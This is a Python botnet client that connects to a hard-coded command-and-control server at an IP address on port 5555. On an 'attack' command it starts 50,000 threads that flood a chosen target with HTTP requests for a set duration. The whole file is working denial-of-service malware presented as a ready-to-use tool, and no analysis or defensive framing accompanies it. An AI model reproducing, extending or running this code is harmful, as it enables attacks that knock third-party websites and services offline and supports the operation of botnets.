import socket
import threading
import time

# Bot Configuration
C2_HOST = '157.173.221.34'  # Ganti dengan IP server C2
C2_PORT = 5555

# Attack Function
def perform_attack(target, port, duration):
    print(f"[+] Starting attack on {target}:{port} for {duration} seconds")
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target, port))
            sock.sendall(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")  # HTTP Flood request
            sock.close()
        except socket.error:
            pass  # Ignore errors to keep attacking

# Command Handler
def handle_commands(c2):
    while True:
        try:
            command = c2.recv(1024).decode().strip()
            if command.startswith("attack"):
                # Format: attack <target_ip> <port> <duration>
                _, target, port, duration = command.split()
                port = int(port)
                duration = int(duration)

                # Start multiple threads for the attack
                threads = []
                for _ in range(50000):  # Adjust thread count as needed
                    t = threading.Thread(target=perform_attack, args=(target, port, duration))
                    threads.append(t)
                    t.start()

                # Wait for all threads to finish
                for t in threads:
                    t.join()

            elif command == "disconnect":
                print("[-] Disconnecting from C2 server.")
                c2.close()
                break
            else:
                print(f"[+] Received unknown command: {command}")
        except Exception as e:
            print(f"[-] Error: {e}")
            break

# Main Bot Logic
def main():
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.connect((C2_HOST, C2_PORT))
    print("[+] Connected to C2 Server")
    handle_commands(c2)

if __name__ == "__main__":
    main()
